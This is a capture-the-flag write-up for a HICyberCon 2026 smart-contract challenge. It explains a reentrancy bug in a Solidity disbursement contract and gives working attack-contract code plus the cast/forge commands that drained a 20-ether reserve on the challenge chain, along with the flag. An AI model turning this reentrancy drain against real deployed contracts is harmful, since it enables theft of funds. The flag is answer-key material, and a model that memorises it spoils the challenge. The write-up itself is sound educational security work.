# Standing Order

**Event:** HICyberCon CTF 2026
**Category:** misc
**Flag:** `hiCTF{one_sig_two_paths_then_the_l00p_df97c83cf9}`

---

HI CyberCon 2026. Live instancer chain: `https://standing-order-<id>.chall.hiddeninvestigations.net`
(RPC at `/`, handout at `/info`, flag at `/flag`), Foundry `cast`/`forge`, Solidity 0.8.24.

## FLAG

```
hiCTF{one_sig_two_paths_then_the_l00p_df97c83cf9}
```

(served by `GET /flag` once `Setup.isSolved()` is true)

## The bug

`Disbursement` has two redemption paths over the **same** voucher:

- `acknowledge()` - checks-effects-interactions: `voucherUsed[digest] = true` BEFORE the ETH send.
- `disburse()` - interaction BEFORE effect: `recipient.call{value: amount}("")` first,
  `voucherUsed[digest] = true` only after the call returns.

`voucherDigest(amount, nonce) = keccak256(abi.encodePacked(amount, nonce))` - no recipient,
no function selector, so the same committee signature is valid on both paths. The only thing
stopping a replay is the `voucherUsed` mapping, and `disburse()` sets it too late.

## Exploit - reentrancy through the value callback

Instance parameters (read from Setup): `RESERVE = 20 ether`, `VOUCHER_AMOUNT = 1 ether`,
`VOUCHER_NONCE = 0`, one 65-byte committee signature.

Because `disburse()` pays before marking the voucher used, every nested frame re-checks
`!voucherUsed[digest]` and still sees `false`. A contract that re-enters `disburse()` from its
`receive()` keeps getting 1 ether per level until the reserve cannot cover another payout.

contracts/Attack.sol:

```solidity
receive() external payable {
    entries++;
    if (address(target).balance >= amount) {          // stop at balance == amount -> last payout leaves 0
        (bool ok,) = address(target).call(            // low-level: an inner failure can't revert the chain
            abi.encodeWithSelector(IDisbursement.disburse.selector, address(this), amount, nonce, sig)
        );
        ok;
    }
}
```

Threshold matters: re-entering when only `< amount` is left would make the inner
`require(ok, "pay: failed")` revert and unwind the whole chain.

## Execution

```bash
export PATH="$PATH:$HOME/.foundry/bin"
R=https://standing-order-1be4a0b3527f.chall.hiddeninvestigations.net
S=0x4A8cde36e5fd97a683Ef39fd6b3FAe40DE81fF13
D=$(cast call $S 'disbursement()(address)' --rpc-url $R)     # 0x4BA7b0Be...394b
cast call $S 'voucher()(uint256,uint256,bytes)' --rpc-url $R # 1e18, 0, 0xa45292...4de91b

# SIG = 0xa45292a319341b3d8bb2a5f7ad6f24439de369c2db1d91e17775b8bbbe31a7bf4c186715f58dc471634a4fede32efd50e10293774300f850f0fa9f8b150a4de91b
# deploy the attacker (constructor: target, amount, nonce, sig)
forge create contracts/Attack.sol:StandingOrderAttack --rpc-url $R \
  --private-key $PK --broadcast --constructor-args $D 1000000000000000000 0 $SIG

cast send <attacker> 'go()' --rpc-url $R --private-key $PK --gas-limit 5000000
curl -sk $R/flag
```

Result: `status 1`, `gasUsed 400782`, `entries = 20`, Disbursement balance 20 ether -> 0,
`isSolved() == true`.

## Verification discipline

Proven on an `anvil --fork-url <instance> -a 0` fork FIRST (free, resettable): 20 re-entries,
drain to 0, `isSolved() == true`, then the identical tx replayed on the live chain with the same
result. No guessing about depth/gas - the loop is balance-bounded, so the depth (20) falls out of
`RESERVE / VOUCHER_AMOUNT`.
